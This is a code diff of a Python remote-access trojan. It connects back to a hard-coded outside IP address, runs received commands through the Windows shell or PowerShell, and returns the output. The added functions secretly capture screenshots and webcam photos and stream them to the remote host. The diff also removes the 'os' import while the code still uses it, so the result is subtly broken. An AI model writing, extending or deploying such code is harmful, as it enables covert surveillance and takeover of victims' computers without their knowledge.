@@ -1,8 +1,25 @@
-import os
 import socket
 import subprocess
+import cv2
 import random
+from PIL import ImageGrab
+from io import BytesIO
 import sys
+
+
+def webcam_pic(s,data):
+     cam_port = 0
+     cam = cv2.VideoCapture(cam_port)
+     result, image = cam.read()
+     filename=str(random.choice(range(100)))+".png"
+     if result: 
+          cv2.imwrite(filename, image) 
+     with open(filename, "rb") as file:
+          while data := file.read(1024):
+               s.send(data)
+     s.send(str.encode("Sended"))
+     cam.release()
+     os.remove(filename)
 
 
 def download(s,data):
@@ -11,24 +28,33 @@ def download(s,data):
           while data := file.read(1024):
               s.sendall(data)
 
+
+def screenshot(s,data):
+     buffer=BytesIO()
+     screenshot = ImageGrab.grab()
+     screenshot.save(buffer,format="PNG")
+     buffer.seek(0)
+     while data := buffer.read(1024):
+          s.send(data)
+     s.send(str.encode("Sended"))
           
           
 def cmd(s,data):
-     try:
-         if data[:2].decode("utf-8")=="cd":
-              cd(s,data)
-         elif data[:8].decode("utf-8")=="download":
-              download(s,data)
-         else:
-              cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-              output=cmd.stdout.read()+cmd.stderr.read()
-              output=str(output,"utf-8")
-              string3=str.encode(output+os.getcwd()+'>',"utf-8")
-              s.sendall(string3)
-     except:
-         print("An Erorr is Occured")
-         s.close()
-         sys.exit()
+     if data[:2].decode("utf-8")=="cd":
+          cd(s,data)
+     elif data[:2].decode("utf-8")=="ss":
+          screenshot(s,data)
+     elif data[:6].decode("utf-8")=="webcam":
+          webcam_pic(s,data)
+     elif data[:8].decode("utf-8")=="download":
+          download(s,data)
+     else:
+          cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+          output=cmd.stdout.read()+cmd.stderr.read()
+          output=str(output,"utf-8")
+          string3=str.encode(output+os.getcwd()+'>',"utf-8")
+          s.sendall(string3)
+
 
 def cd(s,data):
      os.chdir(data[3:].decode("utf-8"))
@@ -36,26 +62,25 @@ def cd(s,data):
                 
                 
 def powershell(s,data):
-     try:
-         if data[:2].decode("utf-8")=="cd":
-               cd(s,data)
-         elif data[:8].decode("utf-8")=="download":
-               download(s,data)
-         else:
-               p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
-               output=p.stdout.read()+p.stderr.read()
-               string3=str.encode(output+os.getcwd()+'>',"utf-8")
-               s.sendall(string3)
-     except:
-          print("An Error is occured")
-          s.close()
-          sys.exit()
+     if data[:2].decode("utf-8")=="cd":
+          cd(s,data)
+     elif data[:2].decode("utf-8")=="ss":
+          screenshot(s,data)
+     elif data[:6].decode("utf-8")=="webcam":
+          webcam_pic(s,data)
+     elif data[:8].decode("utf-8")=="download":
+          download(s,data)
+     else:
+          p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
+          output=p.stdout.read()+p.stderr.read()
+          string3=str.encode(output+os.getcwd()+'>',"utf-8")
+          s.sendall(string3)
 
 
 def connect():
    s=socket.socket()
-   host="192.168.1.67"
-   port=1234
+   host="182.183.126.71"
+   port=1235
    s.connect((host,port))
    choice=s.recv(1024)
    choice=choice.decode("utf-8")
@@ -74,10 +99,9 @@ def main():
                     powershell(s,data)   
                else:
                     sys.exit("WRONG CHOICE")    
-        except :
+        except KeyboardInterrupt:
           s.close()
-          sys.exit()
           break
      s.close()
-     
+  
 main()
